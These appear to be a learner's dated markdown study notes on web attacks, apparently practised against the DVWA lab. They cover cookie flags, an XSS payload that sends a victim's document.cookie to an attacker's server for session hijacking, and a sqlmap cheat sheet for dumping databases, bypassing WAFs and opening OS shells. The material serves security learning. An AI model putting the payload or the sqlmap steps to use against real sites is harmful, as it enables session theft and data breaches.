# JAN
## 14
### Additional Flags to Prevent Cookie Manipulation
- httpOnly flag
- secure flag

### document.location
- Also window.location - represents the URL of the webpage

### Cookie Stealing Using A Web Server
```javascript
<script>document.location='http://your ip/cookiestealer.php?c='+document.cookie;</script>
```

**Motivation:** Uploading a malicious JS script so that an admin views it and his cookies are sent to my server so that I can hijack his session. <br>
**Note:** All session tokens are cookies but no all cookies are session tokens.

## 15
https://www.stationx.net/sqlmap-cheat-sheet/
### SQLMAP
- 6 Techniques
- `--crawl 3` : Depth -> 3
- `--batch` : Default
- `--technique="U"` : Union Attack
- `--threads` : Saves time
- `--risk 1/2/3`
- `--level 1/2/3/4/5` : Increases range of vulnerabilites/Increases false positive
- `-V 1/2/3/4/5`
- ![image](https://github.com/PranjalBasak/Documentation/assets/66166653/9b1f8674-9aa1-44b7-9c7f-ca4a83f87839)

- `--current-user`
- `--current-db`
- `--hostname`
- `--dbs` : Show all Database details
- `-D <database_name> --tables` : Show tables
- `-T <table_name> --dump` : Show data of `<table_name>`
- `-D <db> -T <table> --columns` : Show all the columns of `<table>`
- `-D <db> --dump-all` : Dump all the data of database `<db>`
- `--output-dir=<url>`
- `--headers="Referer:abc.com" -v 4 --batch`
- `--user-agent="GECKO_Chrome" -v 4 --batch`
- `--mobile -v 4 --batch` : Pretending to be a mobile user agent
- `--list-tampers` : Lists WAF Bypass Techniques
- `--tamper=base64encode -v 3 --batch`
- `--forms`: Sends data to a form
- `--data="uname=abc&pass=abc&login=submit" --dbs`
- `--proxy="127.0.0.1:4444"` : Can use burpsuite
- `-r abc --batch`
-  `--cookie`
-  `--flush-session` : Clears SQLi sessions so that we can use new payloads
-  `--comment` : Brings hidden comments
-  `--os-shell` : Brings command shell
-  `--os-cmd`

## 16 Jan

```bash
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

```bash
python3 /bin/sqlmap/sqlmap.py
```

```
0x207c20
```


